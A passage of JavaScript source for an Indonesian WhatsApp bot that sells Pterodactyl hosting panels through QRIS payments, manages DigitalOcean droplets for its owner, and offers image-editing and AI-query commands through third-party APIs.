var orang = db.users[m.sender].saweria.chat
var tekspanel = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Spesifikasi Server*
* Ram : *${Obj.ram == "0" ? "Unlimited" : Obj.ram.split("").length > 4 ? Obj.ram.split("").slice(0,2).join("") + "GB" : Obj.ram.charAt(0) + "GB"}*
* Disk : *${Obj.disk == "0" ? "Unlimited" : Obj.disk.split("").length > 4 ? Obj.disk.split("").slice(0,2).join("") + "GB" : Obj.disk.charAt(0) + "GB"}*
* CPU : *${Obj.cpu == "0" ? "Unlimited" : Obj.cpu+"%"}*
* ${global.domain}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 23 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await fs.writeFileSync("./akunpanel.txt", tekspanel)
await Putzz.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: tekspanel}, {quoted: null})
await fs.unlinkSync("./akunpanel.txt")
await Putzz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

case "buyadp": {
if (m.isGroup) return ReplyLanz("Pembelian panel pterodactyl hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return ReplyLanz("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
let us = crypto.randomBytes(4).toString('hex')
let Obj = {}
Obj.harga = "20000" 
Obj.username = us
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://api.simplebot.my.id/api/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Admin Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await Putzz.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await Putzz.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Putzz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000) 
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://api.simplebot.my.id/api/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await Putzz.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Admin Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = Obj.username
let email = username+"@gmail.com"
let name = capital(username)
let password = crypto.randomBytes(4).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return ReplyLanz(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var teks = `*Data Akun Admin Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
* ${global.domain}

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
await fs.writeFileSync("./akunpanel.txt", teks)
await Putzz.sendMessage(db.users[m.sender].saweria.chat, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
await Putzz.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "batalbeli": {
if (m.isGroup) return
if (db.users[m.sender].status_deposit == false) return 
db.users[m.sender].status_deposit = false
if ('saweria' in db.users[m.sender]) {
await Putzz.sendMessage(m.chat, {text: "Berhasil membatalkan pembelian ✅"}, {quoted: db.users[m.sender].saweria.msg})
await Putzz.sendMessage(m.chat, { delete: db.users[m.sender].saweria.msg.key })
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
} else {
return ReplyLanz("Berhasil membatalkan pembelian ✅")
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'listdroplet': {
if (!isCreator) return ReplyLanz(mess.owner)
try {
const getDroplets = async () => {
try {
const response = await fetch('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: "Bearer " + global.apiDigitalOcean
}
});
const data = await response.json();
return data.droplets || [];
} catch (err) {
ReplyLanz('Error fetching droplets: ' + err);
return [];
}
};

getDroplets().then(droplets => {
let totalvps = droplets.length;
let mesej = `List droplet digital ocean kamu: ${totalvps}\n\n`;

if (droplets.length === 0) {
mesej += 'Tidak ada droplet yang tersedia!';
} else {
droplets.forEach(droplet => {
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
mesej += `Droplet ID: ${droplet.id}
Hostname: ${droplet.name}
Username: Root
IP: ${ipAddress}
Ram: ${droplet.memory} MB
Cpu: ${droplet.vcpus} CPU
OS: ${droplet.image.distribution}
Storage: ${droplet.disk} GB
Status: ${droplet.status}\n`;
});
}
Putzz.sendMessage(m.chat, { text: mesej }, {quoted: m});
});
} catch (err) {
ReplyLanz('Terjadi kesalahan saat mengambil data droplet: ' + err);
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'restartvps': {
if (!isCreator) return ReplyLanz(mess.owner)
if (!text) return ReplyLanz(example("iddroplet"))
let dropletId = text
const restartVPS = async (dropletId) => {
try {
const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

const response = await fetch(apiUrl, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'reboot'
})
});

if (response.ok) {
const data = await response.json();
return data.action;
} else {
const errorData = await response.json();
ReplyLanz(`Gagal melakukan restart VPS: ${errorData.message}`);
}
} catch (err) {
ReplyLanz('Terjadi kesalahan saat melakukan restart VPS: ' + err);
}
};

restartVPS(dropletId)
.then((action) => {
ReplyLanz(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
})
.catch((err) => {
ReplyLanz(err);
})

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'rebuild': {
if (!isCreator) return ReplyLanz(mess.owner)
if (!text) return ReplyLanz(example("iddroplet"))
let dropletId = text 
let rebuildVPS = async () => {
try {
// Rebuild droplet menggunakan API DigitalOcean
const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'rebuild',
image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
})
});

if (response.ok) {
const data = await response.json();
ReplyLanz('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);
const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});
if (vpsInfo.ok) {
const vpsData = await vpsInfo.json();
const droplet = vpsData.droplet;
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';

const textvps = `*VPS BERHASIL DI REBUILD*
IP VPS: ${ipAddress}
SYSTEM IMAGE: ${droplet.image.slug}`;
await sleep(60000) 
Putzz.sendMessage(m.chat, { text: textvps }, {quoted: m});
} else {
ReplyLanz('Gagal mendapatkan informasi VPS setelah rebuild!');
}
} else {
const errorData = await response.json();
ReplyLanz('Gagal melakukan rebuild VPS : ' + errorData.message);
}
} catch (err) {
ReplyLanz('Terjadi kesalahan saat melakukan rebuild VPS : ' + err);
}};
rebuildVPS();
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "sisadroplet": {
if (!isCreator) return ReplyLanz(mess.owner)
async function getDropletInfo() {
try {
const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

if (accountResponse.status === 200 && dropletsResponse.status === 200) {
const dropletLimit = accountResponse.data.account.droplet_limit;
const dropletsCount = dropletsResponse.data.droplets.length;
const remainingDroplets = dropletLimit - dropletsCount;

return {
dropletLimit,
remainingDroplets,
totalDroplets: dropletsCount,
};
} else {
return new Error('Gagal mendapatkan data akun digital ocean atau droplet!');
}
} catch (err) {
return err;
}}
async function sisadropletHandler() {
try {
if (!isCreator) return ReplyLanz(mess.owner)

const dropletInfo = await getDropletInfo();
ReplyLanz(`Sisa droplet yang dapat kamu pakai: ${dropletInfo.remainingDroplets}

Total droplet terpakai: ${dropletInfo.totalDroplets}`);
} catch (err) {
ReplyLanz(`Terjadi kesalahan: ${err}`);
}}
sisadropletHandler();
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "deldroplet": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!text) return ReplyLanz(example("iddroplet"))
let dropletId = text
let deleteDroplet = async () => {
try {
let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'DELETE',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});

if (response.ok) {
ReplyLanz('Droplet berhasil dihapus!');
} else {
const errorData = await response.json();
return new Error(`Gagal menghapus droplet: ${errorData.message}`);
}
} catch (error) {
console.error('Terjadi kesalahan saat menghapus droplet:', error);
ReplyLanz('Terjadi kesalahan saat menghapus droplet.');
}};
deleteDroplet();
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "cvps": {
if (!text) return ReplyLanz(example("hostname"))
return Putzz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Spesifikasi Vps',
          sections: [
            {
              title: 'List Ram & Cpu Vps',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram 16GB || CPU 4', 
                  id: `.r16c4 ${text}`
                },
                {
                  title: 'Ram 1GB || CPU 1', 
                  id: `.r1c1 ${text}`
                },
                {
                  title: 'Ram 2GB || CPU 1', 
                  id: `.r2c1 ${text}`
                },
                {
                  title: 'Ram 2GB || CPU 2', 
                  id: `.r2c2 ${text}`
                },
                {
                  title: 'Ram 4GB || CPU 2', 
                  id: `.r4c2 ${text}`
                },      
                {
                  title: 'Ram 8GB || CPU 4', 
                  id: `.r8c4 ${text}`
                }                     
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Spesifikasi Vps Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
//fitur tozombie 🗿🗿🗿
case 'tozombie': case 'jadizombie': case 'jadi-zombie': {
                if (!/image/.test(mime) && !/video/.test(mime) && !/audio/.test(mime) && !/webp/.test(mime)) return ReplyLanz('Harus berupa video, gambar, atau stiker')
                let media = await Putzz.downloadAndSaveMediaMessage(quoted)
                lock()
                try {
                    const catBoxUrl = await CatBox(media)
                    const result = `https://api.ditss.cloud/imagecreator/tozombie?apikey=DitssGanteng&url=${catBoxUrl}`
                    Putzz.sendMessage(m.chat, {
                    image: {
                        url: result
                    },
                    caption: `done😈`
                }, {
                    quoted: m
                })
                } catch (err) {
                    console.error(err)
                } finally {
                    await fs.unlinkSync(media)
                }
            }
            break
//fitur toanime 🗿😭
/*case 'toanime':
case 'jadianime':
case 'jadi-anime':
case 'to-anime': {
  if (!/image/.test(mime) && !/video/.test(mime) && !/audio/.test(mime) && !/webp/.test(mime)) {
    return ReplyLanz('Harus berupa video, gambar, atau stiker');
  }

  let media;
  try {
    media = await Putzz.downloadAndSaveMediaMessage(qmsg);
    if (!media || !fs.existsSync(media)) throw new Error("Gagal mengunduh media");

    lock();

    const catBoxUrl = await CatBox(media);
    const result = `https://api.ditss.cloud/imagecreator/toanime?apikey=DitssGanteng&url=${catBoxUrl}`;

    await Putzz.sendMessage(m.chat, {
      image: { url: result },
      caption: `done😈`
    }, { quoted: m });

  } catch (err) {
    console.error("❌ Error di toanime:", err);
    ReplyLanz("❌ Gagal membuat anime dari media.");
  } finally {
    if (media && fs.existsSync(media)) {
      fs.unlinkSync(media);
    }
  }
}
break;*/
           
case 'nobgg':
case 'imagenobg':
case 'removebgh':
case 'remove-bg': {

 if (!/image/.test(mime)) return ReplyLanz("⚠️ Silakan kirim atau reply foto!");
 const rqmsg = (quoted.msg || quoted)
 let media = await Putzz.downloadAndSaveMediaMessage(rqmsg);
 try {
         await Putzz.sendMessage(m.chat, {
            react: { text: "⏳", key: m.key }
        });
 // Mengonversi gambar ke URL menggunakan kode yang sudah ada
 const { ImageUploadService } = require('node-upload-images');
 const service = new ImageUploadService('pixhost.to');
 // Mengunggah gambar ke Pixhost
 let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'imgtmp.png');
 let urlGambar = directLink.toString();
 // Menggunakan API untuk menghapus background
 let removeBgUrl = `https://api.siputzx.my.id/api/iloveimg/removebg?image=${urlGambar}&scale=2`;
 // Mengirimkan gambar hasil background yang dihapus
 await Putzz.sendMessage(m.chat, {
 image: { url: removeBgUrl },
 caption: "✅ Background berhasil dihapus!",
 }, { quoted: m });
         await Putzz.sendMessage(m.chat, {
            react: { text: "✅", key: m.key }
        });
 } catch (error) {
 console.error("Error pada removebg:", error);
 ReplyLanz("❌ Gagal menghapus background. Coba lagi nanti!");
 }
 await fs.unlinkSync(media); // Menghapus file sementara
}
break

case "ai-v2": case 'ai':
case "heckai":
 if (!args.length) {
 return ReplyLanz("Silakan masukkan pertanyaan untuk AI.\n\nContoh: *heckai Sekarang hari apa?*");
 }
 let query = encodeURIComponent(args.join(" "));
 let apiUrl3 = `https://www.laurine.site/api/ai/heckai?query=${query}`;
 try {
 let response = await fetch(apiUrl3);
 let data = await response.json();
 if (!data.status || !data.data) {
 return ReplyLanz("❌ AI tidak dapat memberikan jawaban.");
 }
 ReplyLanz(`🤖 *AI Response:*\n\n${data.data}`);
 } catch (error) {
 console.error(error);
 ReplyLanz("❌ Terjadi kesalahan saat mengakses AI.");
 }
 break
case "r1c1": case "r2c1": case "r2c2": case "r4c2": case "r8c4": case "r16c4": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!text) return
    await sleep(1000)
    let images
    let region = "sgp1"
    if (command == "r1c1") {
    images = "s-1vcpu-1gb"
    } else if (command == "r2c1") {
    images = "s-1vcpu-2gb"
    } else if (command == "r2c2") {
    images = "s-2vcpu-2gb"
    } else if (command == "r4c2") {
    images = "s-2vcpu-4gb"
    } else if (command == "r8c4") {
    images = 's-4vcpu-8gb'
    } else {
    images = "s-4vcpu-16gb-amd"
    region = "sgp1"
    }
    let hostname = text.toLowerCase()
    if (!hostname) return ReplyLanz(example("hostname"))
    
    try {        
        let dropletData = {
            name: hostname,
            region: region, 
            size: images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await  generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await ReplyLanz(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await Putzz.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        ReplyLanz(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "1gb-v2": case "2gb-v2": case "3gb-v2": case "4gb-v2": case "5gb-v2": case "6gb-v2": case "7gb-v2": case "8gb-v2": case "9gb-v2": case "10gb-v2": case "unlimited-v2": case "unli-v2": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!text) return ReplyLanz(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb-v2") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb-v2") {
ram = "2000"
disknya = "2000"
cpu = "60"
} else if (command == "3gb-v2") {
ram = "3000"
disknya = "3000"
cpu = "80"
} else if (command == "4gb-v2") {
ram = "4000"
disknya = "4000"
cpu = "100"
} else if (command == "5gb-v2") {
ram = "5000"
disknya = "5000"
cpu = "120"
} else if (command == "6gb-v2") {
ram = "6000"
disknya = "6000"
cpu = "140"
} else if (command == "7gb-v2") {
ram = "7000"
disknya = "7000"
cpu = "160"
} else if (command == "8gb-v2") {
ram = "8000"
disknya = "8000"
cpu = "180"
} else if (command == "9gb-v2") {
ram = "9000"
disknya = "9000"
cpu = "200"
} else if (command == "10gb-v2") {
ram = "10000"
disknya = "10000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domainV2 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return ReplyLanz(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domainV2 + `/api/application/nests/${nestidV2}/eggs/` + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggV2),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return ReplyLanz(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await ReplyLanz("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `*Data Akun Panel Kamu 📦*

*📡 ID Server (${server.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password}

*🌐 Spesifikasi Server*
* Ram : *${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}*
* Disk : *${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}*
* CPU : *${cpu == "0" ? "Unlimited" : cpu+"%"}*
* ${global.domainV2}

*Syarat & Ketentuan :*
* Expired panel 1 bulan
* Simpan data ini sebaik mungkin
* Garansi pembelian 15 hari (1x replace)
* Claim garansi wajib membawa bukti chat pembelian
`
await fs.writeFileSync("akunpanel.txt", teks)
await Putzz.sendMessage(orang, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
delete global.panel
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listadmin-v2": {
if (!isCreator) return ReplyLanz(mess.owner)
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return ReplyLanz("Tidak ada admin panel")
var teks = "\n *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await Putzz.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin-v2`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listpanel-v2": {
if (!isCreator) return ReplyLanz(mess.owner)
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return ReplyLanz("Tidak Ada Server Bot")
let messageText = "\n  *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await Putzz.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.delpanel-v2`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "deladmin-v2": {
if (!isCreator) return ReplyLanz(mess.owner)
if (!text) {
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return ReplyLanz("Tidak ada admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${i.attributes.id}`
})
})
return Putzz.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: 'List Admin Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Salah Satu Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domainV2 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return ReplyLanz("Akun admin panel tidak ditemukan!")
await ReplyLanz(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delpanel-v2": {
if (!isCreator && !isPremium) return ReplyLanz(mess.owner)
if (!text) {
let list = []
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return ReplyLanz("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
